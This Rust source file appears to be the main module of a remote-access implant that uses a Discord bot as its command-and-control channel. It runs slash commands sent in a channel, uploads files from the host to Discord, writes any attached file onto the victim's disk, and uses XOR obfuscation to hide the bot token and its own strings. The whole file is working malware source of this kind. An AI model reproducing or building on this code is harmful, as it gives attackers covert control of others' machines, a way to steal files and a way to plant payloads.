use anyhow::{Result, bail};
use tokio;
use tokio::io::AsyncWriteExt;
use serenity::async_trait;
use serenity::client::Context;
use serenity::all::ChannelId;
use serenity::model::channel::{AttachmentType, Message};
use serenity::builder::CreateMessage;
use serenity::prelude::*;
use std::sync::Arc;
use std::path::{Path, PathBuf};

mod modules;
mod core;

struct Handler;
struct Discord {
    ctx : Arc<Context>,
    id  : ChannelId,
}

///////////
#[tokio::main]
async fn main() -> Result<()> {

    ///////////////////////////////////////////
    // [!] Simple XOR obfuscation is applied, the encoded values will still be hardcoded in the binary
    let token = obfuscate!("YOUR_DISCORD_TOKEN");
    ///////////////////////////////////////////
    
    println!("{}", obfuscate!("[*] Connecting to Discord ...")); 
    bot_connect(&token).await?;

    Ok(())
}

async fn bot_connect(token: &str) -> Result<()> {

    let intents = GatewayIntents::GUILD_MESSAGES | GatewayIntents::DIRECT_MESSAGES | GatewayIntents::MESSAGE_CONTENT;
    let mut client = Client::builder(&token, intents).event_handler(Handler).await?;
 
    if let Err(why) = client.start().await {
        bail!("{why}");
    }
    
    Ok(())
}


#[async_trait]
impl core::commands::MessageSender for Discord {

    async fn message(&self, content: &str) -> Result<()> {
        let content = style(content);
        self.id.say(&self.ctx, &content).await?;
        Ok(())
    }

    async fn upload(&self, path: String) -> Result<()> {

        let attach = AttachmentType::path(Path::new(&path)).await?;
        self.id.send_files(&self.ctx.http, vec![attach], CreateMessage::new()).await?;

        Ok(())
    }

}

// Implementig a MessageSender trait to ensure the compatibility between different bot APIs
#[async_trait]
impl EventHandler for Handler {
    async fn message(&self, ctx: Context, msg: Message) {
        let sender = Discord {
            ctx: Arc::new(ctx.clone()),
            id : msg.channel_id,
        };
        if msg.author.id == ctx.cache.current_user().id {
            return;
            // Ignore the bot's own messages 
        } 

        if msg.content.starts_with("/") {  

            let cmd = &msg.content.to_lowercase();
            core::commands::command_handler(&sender, cmd).await;
  
        }

        // Download files and attachements if available :)
        if !msg.attachments.is_empty() {
            for attach in &msg.attachments {
                let content = match attach.download().await{
                    Ok(bytes) => bytes,
                    Err(e) => {
                        let text = obfuscate!("Failed to download file to the host: ");
                        msg.channel_id.say(&ctx, format!("{text}{e}")).await; 
                        continue;
                    }
                };

                let mut file_path = match tokio::fs::File::create(&attach.filename).await{
                    Ok(f) => f,
                    Err(e) => {
                        let text = obfuscate!("Failed to create file on disk :");
                        msg.channel_id.say(&ctx, format!("{text}{e}")).await; 
                        continue;
                    }
                };

                if let Err(e) = file_path.write_all(&content).await{
                        let text = obfuscate!("Failed to write downloaded file to disk: ");
                        msg.channel_id.say(&ctx, format!("{text}{e}")).await; 
                        continue;                    
                };
                msg.channel_id.say(&ctx, format!("Saved to : {}", &attach.filename)).await; 
                        
            }
            
        }
    
    }
}

fn style(text: &str) -> String {
    text.replace("*b_", "**")
        .replace("_b*", "**")
        .replace("*c_", "```")
        .replace("_c*", "```")

}